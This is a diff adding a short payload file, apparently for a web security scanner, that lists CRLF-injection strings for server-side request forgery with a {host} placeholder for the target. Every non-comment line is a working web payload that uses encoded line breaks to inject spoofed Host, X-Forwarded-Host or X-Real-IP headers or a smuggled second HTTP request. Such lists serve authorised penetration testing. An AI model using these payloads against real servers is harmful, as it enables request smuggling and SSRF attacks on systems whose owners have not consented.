@@ -1,0 +1,10 @@
+# Payloads for CRLF-based SSRF. {host} will be replaced by the target payload.
+# These are injected into headers.
+ignored.com%0d%0aHost:%20{host}
+ignored.com%0d%0aX-Forwarded-Host:%20{host}
+ignored.com%0d%0aX-Real-IP:%20{host}
+ignored.com%0d%0aGET%20/index.html%20HTTP/1.1%0d%0aHost:%20{host}%0d%0aConnection:%20close%0d%0a%0d%0a
+ignored.com%0d%0aGET%20http://{host}/%20HTTP/1.1%0d%0aHeader:%20value
+ignored.com%0aHost:%20{host}
+ignored.com%0dHost:%20{host}
+ignored.com%20%0d%0aHost:%20{host}
